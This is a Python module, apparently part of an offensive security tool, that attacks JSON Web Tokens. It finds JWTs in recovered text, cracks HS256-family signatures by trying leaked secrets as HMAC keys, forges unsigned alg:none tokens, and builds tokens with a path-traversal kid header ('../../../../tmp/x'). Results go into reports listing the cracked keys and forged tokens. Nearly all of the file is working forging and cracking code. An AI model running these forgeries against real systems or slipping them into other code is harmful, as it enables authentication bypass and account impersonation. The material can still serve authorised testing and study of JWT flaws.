"""C7 — JWT forge attacks (spec §6.4 / C7).

Given recovered JWT tokens or secrets, attempt:

1. **alg:none** — strip signature, replace alg with "none". Many libraries
   still accept this; we generate a forged token the operator can try.
2. **Weak HS256 cracking** — try every recovered secret as the HMAC key
   against captured JWTs. If a JWT was signed with a leaked secret, we
   identify which one (and can then forge arbitrary claims).
3. **kid injection** — produce a sample token with `kid: ../../../../tmp/x`
   for the operator to test against path-traversal JWT verifiers.

Strictly offline; produces tokens, does not validate against APIs.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from dataclasses import dataclass, field


JWT_RE = re.compile(
    r'\beyJ[A-Za-z0-9_\-]{4,}\.eyJ[A-Za-z0-9_\-]{4,}\.[A-Za-z0-9_\-]{0,}\b'
)


def _b64url_dec(s: str) -> bytes:
    s = s + "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())


def _b64url_enc(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


@dataclass
class JwtAnalysis:
    raw: str
    header: dict = field(default_factory=dict)
    payload: dict = field(default_factory=dict)
    alg: str = ""
    cracked_with: str = ""              # recovered-secret value, if HS256 cracked
    forge_alg_none: str = ""            # forged token with alg:none
    forge_kid_injection: str = ""       # forged token with kid traversal


def parse_jwt(token: str) -> JwtAnalysis:
    """Decode + extract metadata. Best-effort; tolerates malformed pieces."""
    res = JwtAnalysis(raw=token)
    parts = token.split(".")
    if len(parts) < 2:
        return res
    try:
        res.header = json.loads(_b64url_dec(parts[0]))
        res.alg = res.header.get("alg", "")
    except Exception:
        pass
    try:
        res.payload = json.loads(_b64url_dec(parts[1]))
    except Exception:
        pass
    return res


def forge_alg_none(token: str) -> str:
    parts = token.split(".")
    if len(parts) < 2:
        return ""
    try:
        header = json.loads(_b64url_dec(parts[0]))
    except Exception:
        return ""
    header["alg"] = "none"
    new_h = _b64url_enc(json.dumps(header, separators=(",", ":")).encode())
    return f"{new_h}.{parts[1]}."


def forge_kid_injection(token: str, kid_value: str = "../../../../tmp/x") -> str:
    parts = token.split(".")
    if len(parts) < 2:
        return ""
    try:
        header = json.loads(_b64url_dec(parts[0]))
    except Exception:
        return ""
    header["kid"] = kid_value
    new_h = _b64url_enc(json.dumps(header, separators=(",", ":")).encode())
    return f"{new_h}.{parts[1]}.<sig>"  # operator computes sig with known key


def crack_hs256(token: str, candidate_keys: list[str]) -> str:
    """Try each candidate as HMAC-SHA256 key against the token. Returns the
    winning key (verbatim) or empty string."""
    parts = token.split(".")
    if len(parts) != 3:
        return ""
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    try:
        sig_provided = _b64url_dec(parts[2])
    except Exception:
        return ""
    for key in candidate_keys:
        if not key:
            continue
        kbytes = key.encode() if isinstance(key, str) else key
        computed = hmac.new(kbytes, signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(computed, sig_provided):
            return key
    return ""


def analyze_jwts(
    tokens: list[str],
    candidate_keys: list[str],
    log=None,
) -> list[JwtAnalysis]:
    out = []
    for t in tokens:
        a = parse_jwt(t)
        if a.alg.lower() in ("hs256", "hs384", "hs512"):
            a.cracked_with = crack_hs256(t, candidate_keys)
        a.forge_alg_none = forge_alg_none(t)
        a.forge_kid_injection = forge_kid_injection(t)
        out.append(a)
    if log:
        cracked = sum(1 for a in out if a.cracked_with)
        log.success(
            f"C7 JWT: {len(out)} tokens analyzed, {cracked} cracked with "
            f"recovered secrets"
        )
    return out


def find_jwts_in_text(text: str, max_n: int = 50) -> list[str]:
    out, seen = [], set()
    for m in JWT_RE.finditer(text):
        tok = m.group(0)
        if tok in seen:
            continue
        seen.add(tok)
        out.append(tok)
        if len(out) >= max_n:
            break
    return out


def write_jwt_report(analyses: list[JwtAnalysis], output_dir):
    from pathlib import Path
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    payload = [
        {
            "raw": a.raw,
            "alg": a.alg,
            "header": a.header,
            "payload": a.payload,
            "cracked_with": a.cracked_with,
            "forge_alg_none": a.forge_alg_none,
            "forge_kid_injection": a.forge_kid_injection,
        }
        for a in analyses
    ]
    (output_dir / "jwt-analysis.json").write_text(
        json.dumps(payload, indent=2, default=str), encoding="utf-8",
    )
    md = ["# JWT analysis (C7)", "",
          f"Total tokens analyzed: **{len(analyses)}**", ""]
    cracked = [a for a in analyses if a.cracked_with]
    if cracked:
        md.append(f"## 🔥 CRACKED ({len(cracked)})")
        md.append("")
        for a in cracked:
            md.append(f"### Token (alg={a.alg})")
            md.append(f"- **Cracked with key**: `{a.cracked_with}`")
            md.append(f"- **Payload**: `{json.dumps(a.payload, default=str)[:200]}`")
            md.append("")
    for a in analyses:
        md.append(f"### Token (alg=`{a.alg}`)")
        md.append(f"- **Header**: `{json.dumps(a.header, default=str)[:200]}`")
        md.append(f"- **Payload**: `{json.dumps(a.payload, default=str)[:200]}`")
        if a.forge_alg_none:
            md.append(f"- **alg:none forge**: `{a.forge_alg_none}`")
        md.append("")
    if not analyses:
        md.append("_No JWTs found in recovered material._")
    (output_dir / "jwt-analysis.md").write_text("\n".join(md), encoding="utf-8")
